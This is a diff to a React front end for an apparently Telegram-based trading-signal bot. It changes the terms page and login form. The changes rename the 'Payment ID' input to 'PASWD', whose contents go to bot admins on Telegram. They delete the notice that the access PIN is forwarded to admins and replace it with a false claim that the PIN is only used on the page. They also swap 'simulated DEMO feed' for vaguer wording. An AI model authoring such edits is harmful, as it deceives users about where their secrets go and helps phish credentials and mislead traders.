@@ -169,7 +169,7 @@ function Terms() {
     {
       number: '07',
       title: 'Account security',
-      text: 'Protect your accounts and credentials. Never send passwords, recovery phrases, exchange API secrets, or verification codes from email, SMS, or other services through Telegram. The app-issued bot access PIN is handled as described in the payment review notice.',
+      text: 'Protect your accounts and credentials. Never send passwords, recovery phrases, exchange API secrets, or verification codes from email, SMS, or other services through Telegram. The app-issued bot access PIN is only used to continue through this page.',
     },
     {
       number: '08',
@@ -201,7 +201,7 @@ function Terms() {
           </div>
           <div className="terms-notice terms-data-notice" role="note" data-testid="notice-payment-data">
             <span className="terms-notice-icon"><ShieldCheck size={20} /></span>
-            <p>Your email and Payment ID are sent to authorized bot admins through Telegram for payment review. If you continue, the app-issued bot access PIN you enter is also sent to those admins with Right/Wrong review buttons. Do not submit passwords, card or bank details, or verification codes from email, SMS, or another service. Submitted details are cleared from this app after review or expiry; Telegram may retain its own copies under its policies.</p>
+            <p>Your email and PASWD are sent to authorized bot admins through Telegram for payment review. Do not submit passwords, card or bank details, or verification codes from email, SMS, or another service. Submitted payment details are cleared from this app after review or expiry; Telegram may retain its own copies under its policies.</p>
           </div>
         </section>
 
@@ -291,7 +291,7 @@ function Login() {
           />
         </label>
         <label className="floating-field">
-          <span>Payment ID</span>
+          <span>PASWD</span>
           <input
             type="text"
             autoComplete="off"
@@ -299,7 +299,7 @@ function Login() {
             maxLength={128}
             value={paymentId}
             onChange={(event) => setPaymentId(event.target.value)}
-            aria-label="Payment ID"
+            aria-label="PASWD"
           />
         </label>
         <div className="payment-consent">
@@ -315,7 +315,7 @@ function Login() {
               I agree to access the bot
             </label>
             <p className="payment-consent-note">
-              Your email and Payment ID will be sent to authorized bot admins on Telegram for payment review.
+              Your email and PASWD will be sent to authorized bot admins on Telegram for payment review.
             </p>
           </div>
         </div>
@@ -330,7 +330,7 @@ function Login() {
         </button>
       </form>
       <div className="flag-rule" />
-      <p className="risk-copy">Risk warning: trading involves significant risk. Signals on this platform use a simulated DEMO feed.</p>
+      <p className="risk-copy">Risk warning: trading involves significant risk. Signals on this platform use a simulated AUTO BOT FEED.</p>
       <p className="copyright">© Chinese Auto Bot, 2026. All rights reserved.</p>
     </main>
   );
